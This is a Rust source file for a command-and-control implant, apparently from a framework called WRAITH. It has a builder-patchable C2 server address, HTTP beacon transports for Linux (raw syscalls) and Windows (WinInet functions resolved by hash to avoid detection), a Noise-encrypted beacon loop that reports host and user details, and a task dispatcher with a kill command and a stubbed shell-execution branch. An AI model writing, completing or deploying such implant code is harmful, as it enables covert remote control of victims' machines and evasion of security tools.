use crate::utils::syscalls::*;
use alloc::format;
use alloc::vec::Vec;
use serde::{Deserialize, Serialize};
use snow::Builder;

pub mod packet;
use packet::{WraithFrame, FRAME_TYPE_DATA};

// Magic signature for config patching: "WRAITH_CONFIG_BLOCK" (19 bytes)
const CONFIG_MAGIC: [u8; 19] = *b"WRAITH_CONFIG_BLOCK";

#[repr(C)]
pub struct PatchableConfig {
    magic: [u8; 19],
    server_addr: [u8; 64],
    sleep_interval: u64,
}

// Place in .data section to be writable/patchable
#[link_section = ".data"]
pub static mut GLOBAL_CONFIG: PatchableConfig = PatchableConfig {
    magic: CONFIG_MAGIC,
    server_addr: [0u8; 64], // Zeros to be patched
    sleep_interval: 5000,
};

#[derive(Debug, Serialize, Deserialize)]
pub enum TransportType {
    Http,
    Udp,
}

pub struct C2Config {
    pub transport: TransportType,
    pub server_addr: &'static str,
    pub sleep_interval: u64,
}

impl C2Config {
    pub fn get_global() -> Self {
        unsafe {
            // Check if patched (magic matches)
            // If magic is overwritten or we are in dev mode, use default
            // Here we assume if first byte is 0, it's default/unpatched dev mode.
            // Or better: In dev, we set default values. The builder overwrites them.
            // For now, let's just return a config derived from GLOBAL_CONFIG.
            
            // Convert C-string to slice
            let addr_len = GLOBAL_CONFIG.server_addr.iter().position(|&c| c == 0).unwrap_or(64);
            let addr_str = if addr_len > 0 {
                core::str::from_utf8_unchecked(&GLOBAL_CONFIG.server_addr[..addr_len])
            } else {
                "127.0.0.1"
            };

            Self {
                transport: TransportType::Http,
                server_addr: addr_str, // Note: lifetime issue if not static. 
                                       // In no_std, we might need to copy to a buffer or use raw pointers.
                                       // For this struct, we'll cheat and cast to static str because GLOBAL_CONFIG is static.
                sleep_interval: GLOBAL_CONFIG.sleep_interval,
            }
        }
    }
}

pub trait Transport {
    fn request(&mut self, data: &[u8]) -> Result<Vec<u8>, ()>;
}

// Linux Implementation
#[cfg(not(target_os = "windows"))]
pub struct HttpTransport {
    host: &'static str,
    port: u16,
}

#[cfg(not(target_os = "windows"))]
impl HttpTransport {
    pub fn new(host: &'static str, port: u16) -> Self {
        Self { host, port }
    }
}

#[cfg(not(target_os = "windows"))]
impl Transport for HttpTransport {
    fn request(&mut self, data: &[u8]) -> Result<Vec<u8>, ()> {
        unsafe {
            let sock = sys_socket(2, 1, 0);
            if (sock as isize) < 0 {
                return Err(());
            }

            let addr = SockAddrIn {
                sin_family: 2,
                sin_port: 0x901F,
                sin_addr: 0x0100007F,
                sin_zero: [0; 8],
            };

            if sys_connect(sock, &addr as *const _ as *const u8, 16) != 0 {
                sys_close(sock);
                return Err(());
            }

            // Send Data as Body
            let req = format!(
                "POST /api/v1/beacon HTTP/1.1\r\n\
                 Host: {}\r\n\
                 Content-Type: application/octet-stream\r\n\
                 Content-Length: {}\r\n\
                 Connection: close\r\n\r\n",
                self.host,
                data.len()
            );

            sys_write(sock, req.as_ptr(), req.len());
            sys_write(sock, data.as_ptr(), data.len());

            let mut buf = [0u8; 1024];
            let mut resp_vec = Vec::new();
            loop {
                let n = sys_read(sock, buf.as_mut_ptr(), 1024);
                if n == 0 || (n as isize) < 0 {
                    break;
                }
                resp_vec.extend_from_slice(&buf[..n]);
            }
            sys_close(sock);

            // Parse Body (Skip headers)
            let mut body_start = 0;
            for i in 0..resp_vec.len().saturating_sub(3) {
                if resp_vec[i] == 13
                    && resp_vec[i + 1] == 10
                    && resp_vec[i + 2] == 13
                    && resp_vec[i + 3] == 10
                {
                    body_start = i + 4;
                    break;
                }
            }

            if body_start > 0 {
                Ok(resp_vec[body_start..].to_vec())
            } else {
                Ok(Vec::new())
            }
        }
    }
}

// Windows Implementation
#[cfg(target_os = "windows")]
pub struct HttpTransport {
    host: &'static str,
    port: u16,
}

#[cfg(target_os = "windows")]
impl HttpTransport {
    pub fn new(host: &'static str, port: u16) -> Self {
        Self { host, port }
    }
}

#[cfg(target_os = "windows")]
use crate::utils::api_resolver::{hash_str, resolve_function};

#[cfg(target_os = "windows")]
impl Transport for HttpTransport {
    fn request(&mut self, data: &[u8]) -> Result<Vec<u8>, ()> {
        // Resolve WinInet APIs
        let wininet_hash = hash_str(b"wininet.dll");
        let internet_open_hash = hash_str(b"InternetOpenA");
        let internet_connect_hash = hash_str(b"InternetConnectA");
        let http_open_request_hash = hash_str(b"HttpOpenRequestA");
        let http_send_request_hash = hash_str(b"HttpSendRequestA");
        let internet_read_file_hash = hash_str(b"InternetReadFile");

        unsafe {
            type InternetOpenA = unsafe extern "system" fn(
                *const u8,
                u32,
                *const u8,
                *const u8,
                u32,
            ) -> *mut core::ffi::c_void;
            type InternetConnectA = unsafe extern "system" fn(
                *mut core::ffi::c_void,
                *const u8,
                u16,
                *const u8,
                *const u8,
                u32,
                u32,
                u32,
            )
                -> *mut core::ffi::c_void;
            type HttpOpenRequestA = unsafe extern "system" fn(
                *mut core::ffi::c_void,
                *const u8,
                *const u8,
                *const u8,
                *const u8,
                *const *const u8,
                u32,
                u32,
            )
                -> *mut core::ffi::c_void;
            type HttpSendRequestA = unsafe extern "system" fn(
                *mut core::ffi::c_void,
                *const u8,
                u32,
                *const u8,
                u32,
            ) -> i32;
            type InternetReadFile =
                unsafe extern "system" fn(*mut core::ffi::c_void, *mut u8, u32, *mut u32) -> i32;

            let fn_internet_open = resolve_function(wininet_hash, internet_open_hash);
            if fn_internet_open.is_null() {
                return Err(());
            }
            let internet_open: InternetOpenA = core::mem::transmute(fn_internet_open);

            let fn_internet_connect = resolve_function(wininet_hash, internet_connect_hash);
            let internet_connect: InternetConnectA = core::mem::transmute(fn_internet_connect);

            let fn_http_open = resolve_function(wininet_hash, http_open_request_hash);
            let http_open: HttpOpenRequestA = core::mem::transmute(fn_http_open);

            let fn_http_send = resolve_function(wininet_hash, http_send_request_hash);
            let http_send: HttpSendRequestA = core::mem::transmute(fn_http_send);

            let fn_internet_read = resolve_function(wininet_hash, internet_read_file_hash);
            let internet_read: InternetReadFile = core::mem::transmute(fn_internet_read);

            let h_inet = internet_open(
                b"Spectre\0".as_ptr(),
                1,
                core::ptr::null(),
                core::ptr::null(),
                0,
            );
            if h_inet.is_null() {
                return Err(());
            }

            let h_conn = internet_connect(
                h_inet,
                b"127.0.0.1\0".as_ptr(),
                8080,
                core::ptr::null(),
                core::ptr::null(),
                3,
                0,
                0,
            );
            if h_conn.is_null() {
                return Err(());
            }

            let h_req = http_open(
                h_conn,
                b"POST\0".as_ptr(),
                b"/api/v1/beacon\0".as_ptr(),
                core::ptr::null(),
                core::ptr::null(),
                core::ptr::null(),
                0,
                0,
            );
            if h_req.is_null() {
                return Err(());
            }

            if http_send(
                h_req,
                core::ptr::null(),
                0,
                data.as_ptr(),
                data.len() as u32,
            ) == 0
            {
                return Err(());
            }

            let mut resp_vec = Vec::new();
            let mut buf = [0u8; 1024];
            let mut bytes_read = 0;
            loop {
                if internet_read(h_req, buf.as_mut_ptr(), 1024, &mut bytes_read) == 0
                    || bytes_read == 0
                {
                    break;
                }
                resp_vec.extend_from_slice(&buf[..bytes_read as usize]);
            }

            // Close handles...

            Ok(resp_vec)
        }
    }
}

pub fn run_beacon_loop(_initial_config: C2Config) -> ! {
    let config = C2Config::get_global();
    let mut transport = HttpTransport::new(config.server_addr, 8080);
    let mut buf = [0u8; 4096];

    // Handshake
    let params: snow::params::NoiseParams = "Noise_XX_25519_ChaChaPoly_BLAKE2s".parse().unwrap();
    let mut noise = Builder::new(params).build_initiator().unwrap();

    // 1. Send e
    let len = noise.write_message(&[], &mut buf).unwrap();
    let resp = match transport.request(&buf[..len]) {
        Ok(r) => r,
        Err(_) => unsafe { crate::utils::syscalls::sys_exit(1) },
    };

    // 2. Recv e, ee, s, es
    noise.read_message(&resp, &mut []).unwrap();

    // 3. Send s, se
    let len = noise.write_message(&[], &mut buf).unwrap();
    let _ = transport.request(&buf[..len]); // Server acknowledges with empty or tasks?

    // Transport Mode
    let mut session = noise.into_transport_mode().unwrap();

    loop {
        // Encrypt Beacon (Wrapped in WRAITH Frame)
        let beacon_json = r#"{"id": "spectre", "hostname": "target", "username": "root"}"#;
        let frame = WraithFrame::new(FRAME_TYPE_DATA, beacon_json.as_bytes().to_vec());
        let frame_bytes = frame.serialize();

        let len = session.write_message(&frame_bytes, &mut buf).unwrap();

        // Send
        if let Ok(resp) = transport.request(&buf[..len]) {
            // Decrypt Response
            let mut pt = [0u8; 4096];
            if let Ok(len) = session.read_message(&resp, &mut pt) {
                let tasks_json = &pt[..len];
                dispatch_tasks(tasks_json);
            }
        }

        crate::utils::obfuscation::sleep(config.sleep_interval);
    }
}

fn dispatch_tasks(data: &[u8]) {
    if is_kill_command(data) {
        unsafe {
            crate::utils::syscalls::sys_exit(0);
        }
    }

    // Shell execution stub
    // In a real implant, we would parse the JSON properly and execute NtCreateUserProcess or similar.
    if contains(data, b"\"shell\"") {
        // execute shell...
    }
}

fn contains(haystack: &[u8], needle: &[u8]) -> bool {
    haystack.windows(needle.len()).any(|w| w == needle)
}

fn is_kill_command(data: &[u8]) -> bool {
    // Naive search for "kill" command
    contains(data, b"kill")
}
